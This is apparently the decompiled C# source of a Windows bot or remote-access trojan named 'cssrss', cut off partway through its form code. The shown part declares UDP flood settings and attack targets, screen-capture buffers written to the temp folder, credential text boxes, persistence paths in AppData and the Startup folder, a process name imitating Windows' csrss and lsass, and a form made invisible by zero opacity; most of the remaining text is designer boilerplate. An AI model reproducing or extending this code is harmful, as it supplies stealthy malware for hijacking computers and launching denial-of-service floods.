using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace cssrss;

[DesignerGenerated]
public class Form1 : Form
{
	public enum GEnum0
	{

	}

	public enum GEnum1
	{
		PowerOff = -1,
		StandBy = 1,
		PowerOn = 2
	}

	public struct OSVERSIONINFOEX
	{
		public int dwOSVersionInfoSize;

		public int dwMajorVersion;

		public int dwMinorVersion;

		public int dwBuildNumber;

		public int dwPlatformId;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string szCSDVersion;

		public short wServicePackMajor;

		public short wServicePackMinor;

		public short wSuiteMask;

		public byte wProductType;

		public byte wReserved;
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox comboBox_0;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox listBox_0;

	[AccessedThroughProperty("Textkey")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Passwordx")]
	private TextBox textBox_1;

	[AccessedThroughProperty("Usernamex")]
	private TextBox textBox_2;

	[AccessedThroughProperty("udpfloodbar")]
	private TextBox textBox_3;

	[AccessedThroughProperty("Portbar")]
	private TextBox textBox_4;

	[AccessedThroughProperty("udpmessagebar")]
	private TextBox textBox_5;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox richTextBox_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_6;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_7;

	[AccessedThroughProperty("TextBox3")]
	private TextBox textBox_8;

	[AccessedThroughProperty("TextBox4")]
	private TextBox textBox_9;

	[AccessedThroughProperty("TextBox5")]
	private TextBox textBox_10;

	[AccessedThroughProperty("TextBox6")]
	private TextBox textBox_11;

	[AccessedThroughProperty("TextBox7")]
	private TextBox textBox_12;

	[AccessedThroughProperty("TextBox8")]
	private TextBox textBox_13;

	[AccessedThroughProperty("TextBox9")]
	private TextBox textBox_14;

	[AccessedThroughProperty("TextBox10")]
	private TextBox textBox_15;

	[AccessedThroughProperty("TextBox11")]
	private TextBox textBox_16;

	[AccessedThroughProperty("BackgroundWorker4")]
	private BackgroundWorker backgroundWorker_0;

	[AccessedThroughProperty("ListView1")]
	private ListView listView_0;

	[AccessedThroughProperty("Status")]
	private TextBox textBox_17;

	[AccessedThroughProperty("prcs")]
	private TextBox textBox_18;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker backgroundWorker_1;

	[AccessedThroughProperty("BackgroundWorker2")]
	private BackgroundWorker backgroundWorker_2;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox pictureBox_2;

	[AccessedThroughProperty("TextBox12")]
	private TextBox textBox_19;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("PictureBox4")]
	private PictureBox pictureBox_3;

	private int int_0;

	public int wat;

	public int wat2;

	private int int_1;

	private int int_2;

	public string tdapati;

	public string tdapati2;

	[AccessedThroughProperty("bgflood")]
	private BackgroundWorker backgroundWorker_3;

	private bool bool_0;

	private TcpClient tcpClient_0;

	private RegistryKey registryKey_0;

	public static string b64;

	private RegistryKey registryKey_1;

	private RegistryKey registryKey_2;

	private RegistryKey registryKey_3;

	public static string IPxxxx;

	public static int Portxxxx;

	public static string owned = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\system\\cssrss";

	public static string startupfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + cssrss;

	public static RegistryKey key;

	public static int Timexxxx;

	private RegistryKey registryKey_4;

	private RegistryKey registryKey_5;

	private string string_0;

	private int int_3;

	public static int derp = 0;

	public static int spaghetti = 0;

	private int int_4;

	public static Process px = new Process();

	private int int_5;

	private Thread thread_0;

	private string string_1;

	public static int isdisconnected = 0;

	private bool bool_1;

	private bool bool_2;

	private TcpClient tcpClient_1;

	private Thread thread_1;

	private string string_2;

	private Process process_0;

	public static string cssrss;

	public static string lsass;

	private string string_3;

	public static int syntime;

	private TcpClient tcpClient_2;

	private NetworkStream networkStream_0;

	private int int_6;

	public static string IPxxx;

	private Image image_0;

	private ImageFormat imageFormat_0;

	public static int Portxxx;

	public static int Timexxx;

	public static DirectoryInfo theDirInfo = new DirectoryInfo(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath());

	public object attackIp;

	private object object_0;

	private int int_7;

	private string string_4;

	public static int thetime;

	private TcpClient tcpClient_3;

	public int attackPort;

	private Size size_0;

	private Bitmap bitmap_0;

	private Graphics graphics_0;

	public static string udpmessage;

	public object threadamount;

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_2;

	private static IPEndPoint ipendPoint_0;

	public static string Hostxx;

	public static bool IsEnabled;

	private string string_5;

	private string string_6;

	public static int spa;

	public int sadasdas;

	public static int Portxx;

	public static int floodderp;

	public static int UDPzSockets;

	public static int Threads;

	private int int_8;

	private int int_9;

	private string string_7;

	public static string winkeyy;

	private string string_8;

	private bool bool_3;

	private object object_1;

	private object object_2;

	private object object_3;

	public Form1()
	{
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		wat = 0;
		wat2 = 0;
		tdapati = Path.GetTempPath() + "capture.jpg";
		tdapati2 = Path.GetTempPath() + "capture2.jpg";
		vmethod_67(new BackgroundWorker());
		bool_0 = false;
		int_3 = 0;
		tcpClient_2 = new TcpClient();
		int_6 = 0;
		tcpClient_3 = new TcpClient();
		ref Size reference = ref size_0;
		reference = new Size(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		bitmap_0 = new Bitmap(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
		sadasdas = 0;
		bool_3 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new PictureBox());
		vmethod_3(new ComboBox());
		vmethod_5(new PictureBox());
		vmethod_7(new ListBox());
		vmethod_9(new TextBox());
		vmethod_11(new TextBox());
		vmethod_13(new TextBox());
		vmethod_15(new TextBox());
		vmethod_17(new TextBox());
		vmethod_19(new TextBox());
		vmethod_21(new RichTextBox());
		vmethod_23(new TextBox());
		vmethod_25(new TextBox());
		vmethod_27(new TextBox());
		vmethod_29(new TextBox());
		vmethod_31(new TextBox());
		vmethod_33(new TextBox());
		vmethod_35(new TextBox());
		vmethod_37(new TextBox());
		vmethod_39(new TextBox());
		vmethod_41(new TextBox());
		vmethod_43(new TextBox());
		vmethod_45(new BackgroundWorker());
		vmethod_47(new ListView());
		vmethod_49(new TextBox());
		vmethod_51(new TextBox());
		vmethod_53(new Timer(icontainer_0));
		vmethod_55(new BackgroundWorker());
		vmethod_57(new BackgroundWorker());
		vmethod_59(new PictureBox());
		vmethod_61(new TextBox());
		vmethod_63(new Timer(icontainer_0));
		vmethod_65(new PictureBox());
		((ISupportInitialize)vmethod_0()).BeginInit();
		((ISupportInitialize)vmethod_4()).BeginInit();
		((ISupportInitialize)vmethod_58()).BeginInit();
		((ISupportInitialize)vmethod_64()).BeginInit();
		((Control)this).SuspendLayout();
		PictureBox obj = vmethod_0();
		Point location = new Point(0, 0);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("PictureBox1");
		PictureBox obj2 = vmethod_0();
		Size size = new Size(727, 426);
		((Control)obj2).set_Size(size);
		vmethod_0().set_TabIndex(0);
		vmethod_0().set_TabStop(false);
		((ListControl)vmethod_2()).set_FormattingEnabled(true);
		ComboBox obj3 = vmethod_2();
		location = new Point(0, 0);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("ComboBox1");
		ComboBox obj4 = vmethod_2();
		size = new Size(121, 21);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		PictureBox obj5 = vmethod_4();
		location = new Point(0, 0);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("PictureBox2");
		PictureBox obj6 = vmethod_4();
		size = new Size(331, 279);
		((Control)obj6).set_Size(size);
		vmethod_4().set_TabIndex(2);
		vmethod_4().set_TabStop(false);
		((ListControl)vmethod_6()).set_FormattingEnabled(true);
		ListBox obj7 = vmethod_6();
		location = new Point(0, 0);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("ListBox1");
		ListBox obj8 = vmethod_6();
		size = new Size(120, 95);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		TextBox obj9 = vmethod_8();
		location = new Point(0, 0);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("Textkey");
		TextBox obj10 = vmethod_8();
		size = new Size(269, 20);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		TextBox obj11 = vmethod_10();
		location = new Point(0, 0);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("Passwordx");
		TextBox obj12 = vmethod_10();
		size = new Size(269, 20);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		TextBox obj13 = vmethod_12();
		location = new Point(0, 0);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("Usernamex");
		TextBox obj14 = vmethod_12();
		size = new Size(269, 20);
		((Control)obj14).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(6);
		TextBox obj15 = vmethod_14();
		location = new Point(0, 0);
		((Control)obj15).set_Location(location);
		((Control)vmethod_14()).set_Name("udpfloodbar");
		TextBox obj16 = vmethod_14();
		size = new Size(256, 20);
		((Control)obj16).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(7);
		TextBox obj17 = vmethod_16();
		location = new Point(0, 0);
		((Control)obj17).set_Location(location);
		((Control)vmethod_16()).set_Name("Portbar");
		TextBox obj18 = vmethod_16();
		size = new Size(226, 20);
		((Control)obj18).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(8);
		TextBox obj19 = vmethod_18();
		location = new Point(0, 0);
		((Control)obj19).set_Location(location);
		((Control)vmethod_18()).set_Name("udpmessagebar");
		TextBox obj20 = vmethod_18();
		size = new Size(204, 20);
		((Control)obj20).set_Size(size);
		((Control)vmethod_18()).set_TabIndex(9);
		RichTextBox obj21 = vmethod_20();
		location = new Point(0, 0);
		((Control)obj21).set_Location(location);
		((Control)vmethod_20()).set_Name("RichTextBox1");
		RichTextBox obj22 = vmethod_20();
		size = new Size(340, 257);
		((Control)obj22).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(10);
		vmethod_20().set_Text(string.Empty);
		TextBox obj23 = vmethod_22();
		location = new Point(0, 0);
		((Control)obj23).set_Location(location);
		((Control)vmethod_22()).set_Name("TextBox1");
		TextBox obj24 = vmethod_22();
		size = new Size(100, 20);
		((Control)obj24).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(11);
		TextBox obj25 = vmethod_24();
		location = new Point(0, 0);
		((Control)obj25).set_Location(location);
		((Control)vmethod_24()).set_Name("TextBox2");
		TextBox obj26 = vmethod_24();
		size = new Size(100, 20);
		((Control)obj26).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(12);
		TextBox obj27 = vmethod_26();
		location = new Point(0, 0);
		((Control)obj27).set_Location(location);
		((Control)vmethod_26()).set_Name("TextBox3");
		TextBox obj28 = vmethod_26();
		size = new Size(100, 20);
		((Control)obj28).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(13);
		TextBox obj29 = vmethod_28();
		location = new Point(0, 0);
		((Control)obj29).set_Location(location);
		((Control)vmethod_28()).set_Name("TextBox4");
		TextBox obj30 = vmethod_28();
		size = new Size(190, 20);
		((Control)obj30).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(14);
		TextBox obj31 = vmethod_30();
		location = new Point(0, 0);
		((Control)obj31).set_Location(location);
		((Control)vmethod_30()).set_Name("TextBox5");
		TextBox obj32 = vmethod_30();
		size = new Size(143, 20);
		((Control)obj32).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(15);
		TextBox obj33 = vmethod_32();
		location = new Point(0, 0);
		((Control)obj33).set_Location(location);
		((Control)vmethod_32()).set_Name("TextBox6");
		TextBox obj34 = vmethod_32();
		size = new Size(100, 20);
		((Control)obj34).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(16);
		TextBox obj35 = vmethod_34();
		location = new Point(0, 0);
		((Control)obj35).set_Location(location);
		((Control)vmethod_34()).set_Name("TextBox7");
		TextBox obj36 = vmethod_34();
		size = new Size(100, 20);
		((Control)obj36).set_Size(size);
		((Control)vmethod_34()).set_TabIndex(17);
		TextBox obj37 = vmethod_36();
		location = new Point(0, 0);
		((Control)obj37).set_Location(location);
		((Control)vmethod_36()).set_Name("TextBox8");
		TextBox obj38 = vmethod_36();
		size = new Size(100, 20);
		((Control)obj38).set_Size(size);
		((Control)vmethod_36()).set_TabIndex(18);
		TextBox obj39 = vmethod_38();
		location = new Point(0, 0);
		((Control)obj39).set_Location(location);
		((Control)vmethod_38()).set_Name("TextBox9");
		TextBox obj40 = vmethod_38();
		size = new Size(100, 20);
		((Control)obj40).set_Size(size);
		((Control)vmethod_38()).set_TabIndex(19);
		TextBox obj41 = vmethod_40();
		location = new Point(0, 0);
		((Control)obj41).set_Location(location);
		((Control)vmethod_40()).set_Name("TextBox10");
		TextBox obj42 = vmethod_40();
		size = new Size(100, 20);
		((Control)obj42).set_Size(size);
		((Control)vmethod_40()).set_TabIndex(20);
		TextBox obj43 = vmethod_42();
		location = new Point(0, 0);
		((Control)obj43).set_Location(location);
		((Control)vmethod_42()).set_Name("TextBox11");
		TextBox obj44 = vmethod_42();
		size = new Size(100, 20);
		((Control)obj44).set_Size(size);
		((Control)vmethod_42()).set_TabIndex(21);
		ListView obj45 = vmethod_46();
		location = new Point(53, 5);
		((Control)obj45).set_Location(location);
		((Control)vmethod_46()).set_Name("ListView1");
		ListView obj46 = vmethod_46();
		size = new Size(10, 10);
		((Control)obj46).set_Size(size);
		((Control)vmethod_46()).set_TabIndex(22);
		vmethod_46().set_UseCompatibleStateImageBehavior(false);
		TextBox obj47 = vmethod_48();
		location = new Point(53, 0);
		((Control)obj47).set_Location(location);
		((Control)vmethod_48()).set_Name("Status");
		TextBox obj48 = vmethod_48();
		size = new Size(10, 20);
		((Control)obj48).set_Size(size);
		((Control)vmethod_48()).set_TabIndex(23);
		TextBox obj49 = vmethod_50();
		location = new Point(61, 8);
		((Control)obj49).set_Location(location);
		((Control)vmethod_50()).set_Name("prcs");
		TextBox obj50 = vmethod_50();
		size = new Size(10, 20);
		((Control)obj50).set_Size(size);
		((Control)vmethod_50()).set_TabIndex(24);
		vmethod_50().set_Text("Notepad");
		vmethod_52().set_Interval(1000);
		PictureBox obj51 = vmethod_58();
		location = new Point(0, 0);
		((Control)obj51).set_Location(location);
		((Control)vmethod_58()).set_Name("PictureBox3");
		PictureBox obj52 = vmethod_58();
		size = new Size(800, 600);
		((Control)obj52).set_Size(size);
		vmethod_58().set_TabIndex(25);
		vmethod_58().set_TabStop(false);
		TextBox obj53 = vmethod_60();
		location = new Point(0, 0);
		((Control)obj53).set_Location(location);
		((Control)vmethod_60()).set_Name("TextBox12");
		TextBox obj54 = vmethod_60();
		size = new Size(256, 20);
		((Control)obj54).set_Size(size);
		((Control)vmethod_60()).set_TabIndex(26);
		PictureBox obj55 = vmethod_64();
		location = new Point(0, 0);
		((Control)obj55).set_Location(location);
		((Control)vmethod_64()).set_Name("PictureBox4");
		PictureBox obj56 = vmethod_64();
		size = new Size(800, 600);
		((Control)obj56).set_Size(size);
		vmethod_64().set_TabIndex(27);
		vmethod_64().set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(116, 20);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_64());
		((Control)this).get_Controls().Add((Control)(object)vmethod_60());
		((Control)this).get_Controls().Add((Control)(object)vmethod_58());
		((Control)this).get_Controls().Add((Control)(object)vmethod_50());
		((Control)this).get_Controls().Add((Control)(object)vmethod_48());
		((Control)this).get_Controls().Add((Control)(object)vmethod_46());
		((Control)this).get_Controls().Add((Control)(object)vmethod_42());
		((Control)this).get_Controls().Add((Control)(object)vmethod_40());
		((Control)this).get_Controls().Add((Control)(object)vmethod_38());
		((Control)this).get_Controls().Add((Control)(object)vmethod_36());
		((Control)this).get_Controls().Add((Control)(object)vmethod_34());
		((Control)this).get_Controls().Add((Control)(object)vmethod_32());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Control)this).get_Controls().Add((Control)(object)vmethod_28());
		((Control)this).get_Controls().Add((Control)(object)vmethod_30());
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Text("Form1");
		((ISupportInitialize)vmethod_0()).EndInit();
		((ISupportInitialize)vmethod_4()).EndInit();
		((ISupportInitialize)vmethod_58()).EndInit();
		((ISupportInitialize)vmethod_64()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_0()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(PictureBox pictureBox_4)
	{
		pictureBox_0 = pictureBox_4;
	}

	[DebuggerNonUserCode]
	internal virtual ComboBox vmethod_2()
	{
		return comboBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(ComboBox comboBox_1)
	{
		comboBox_0 = comboBox_1;
	}

	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_4()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(PictureBox pictureBox_4)
	{
		pictureBox_1 = pictureBox_4;
	}

	[DebuggerNonUserCode]
	internal virtual ListBox vmethod_6()
	{
		return listBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(ListBox listBox_1)
	{
		listBox_0 = listBox_1;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_8()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_9(TextBox textBox_20)
	{
		textBox_0 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_10()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_11(TextBox textBox_20)
	{
		textBox_1 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_12()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_13(TextBox textBox_20)
	{
		textBox_2 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_14()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_15(TextBox textBox_20)
	{
		textBox_3 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_16()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_17(TextBox textBox_20)
	{
		textBox_4 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_18()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_19(TextBox textBox_20)
	{
		textBox_5 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_20()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_21(RichTextBox richTextBox_1)
	{
		richTextBox_0 = richTextBox_1;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_22()
	{
		return textBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_23(TextBox textBox_20)
	{
		textBox_6 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_24()
	{
		return textBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_25(TextBox textBox_20)
	{
		textBox_7 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_26()
	{
		return textBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_27(TextBox textBox_20)
	{
		textBox_8 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_28()
	{
		return textBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_29(TextBox textBox_20)
	{
		textBox_9 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_30()
	{
		return textBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_31(TextBox textBox_20)
	{
		textBox_10 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_32()
	{
		return textBox_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_33(TextBox textBox_20)
	{
		textBox_11 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_34()
	{
		return textBox_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_35(TextBox textBox_20)
	{
		textBox_12 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_36()
	{
		return textBox_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_37(TextBox textBox_20)
	{
		textBox_13 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_38()
	{
		return textBox_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_39(TextBox textBox_20)
	{
		textBox_14 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_40()
	{
		return textBox_15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_41(TextBox textBox_20)
	{
		textBox_15 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_42()
	{
		return textBox_16;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_43(TextBox textBox_20)
	{
		EventHandler eventHandler = method_7;
		if (textBox_16 != null)
		{
			((Control)textBox_16).remove_TextChanged(eventHandler);
		}
		textBox_16 = textBox_20;
		if (textBox_16 != null)
		{
			((Control)textBox_16).add_TextChanged(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual BackgroundWorker vmethod_44()
	{
		return backgroundWorker_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_45(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = method_5;
		if (backgroundWorker_0 != null)
		{
			backgroundWorker_0.DoWork -= value;
		}
		backgroundWorker_0 = backgroundWorker_4;
		if (backgroundWorker_0 != null)
		{
			backgroundWorker_0.DoWork += value;
		}
	}

	[DebuggerNonUserCode]
	internal virtual ListView vmethod_46()
	{
		return listView_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_47(ListView listView_1)
	{
		listView_0 = listView_1;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_48()
	{
		return textBox_17;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_49(TextBox textBox_20)
	{
		textBox_17 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_50()
	{
		return textBox_18;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_51(TextBox textBox_20)
	{
		textBox_18 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_52()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_53(Timer timer_2)
	{
		EventHandler eventHandler = method_9;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
